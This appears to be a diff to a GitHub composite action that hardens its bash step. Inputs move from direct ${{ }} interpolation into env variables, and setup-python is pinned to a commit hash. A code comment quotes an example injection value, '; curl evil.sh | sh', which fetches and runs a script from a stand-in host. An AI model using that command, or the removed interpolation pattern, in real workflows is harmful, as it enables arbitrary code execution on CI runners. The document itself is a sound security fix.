@@ -26,21 +26,42 @@ inputs:
 runs:
   using: composite
   steps:
-    - uses: actions/setup-python@v5
+    - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
       with:
         python-version: "3.11"
     - shell: bash
       run: python3 -m pip install -e "$GITHUB_ACTION_PATH"
     - shell: bash
+      # Inputs arrive as environment variables and are appended to the
+      # argument array as data. They used to be interpolated by
+      # `${{ }}` directly into this script, which means GitHub
+      # substitutes them *before* bash parses it: a caller passing
+      # `; curl evil.sh | sh` supplied source code rather than an
+      # argument, and shell metacharacters in an ordinary path were
+      # enough to break the run by accident (D43).
+      #
+      # `env:` values are not source. Bash expands them after parsing,
+      # inside quotes, and `args+=(...)` keeps each one a single word
+      # however it is spelled.
+      env:
+        INPUT_CONFIG: ${{ inputs.config }}
+        INPUT_CHANGED_ONLY: ${{ inputs.changed-only }}
+        INPUT_FAIL_ON_GATE: ${{ inputs.fail-on-gate }}
+        INPUT_RECORD_HISTORY: ${{ inputs.record-history }}
       run: |
-        args=(maintainability-agent --config "${{ inputs.config }}" --output maintainability-report.md --prompt-output maintainability-remediation-prompt.md --comment-output maintainability-pr-comment.md --sarif-output maintainability.sarif)
-        if [ -n "${{ inputs.changed-only }}" ]; then
-          args+=(--changed-only "${{ inputs.changed-only }}")
+        args=(maintainability-agent
+              --config "$INPUT_CONFIG"
+              --output maintainability-report.md
+              --prompt-output maintainability-remediation-prompt.md
+              --comment-output maintainability-pr-comment.md
+              --sarif-output maintainability.sarif)
+        if [ -n "$INPUT_CHANGED_ONLY" ]; then
+          args+=(--changed-only "$INPUT_CHANGED_ONLY")
         fi
-        if [ "${{ inputs.fail-on-gate }}" = "true" ]; then
+        if [ "$INPUT_FAIL_ON_GATE" = "true" ]; then
           args+=(--fail-on-gate)
         fi
-        if [ "${{ inputs.record-history }}" = "true" ]; then
+        if [ "$INPUT_RECORD_HISTORY" = "true" ]; then
           args+=(--record-history)
         fi
         "${args[@]}"
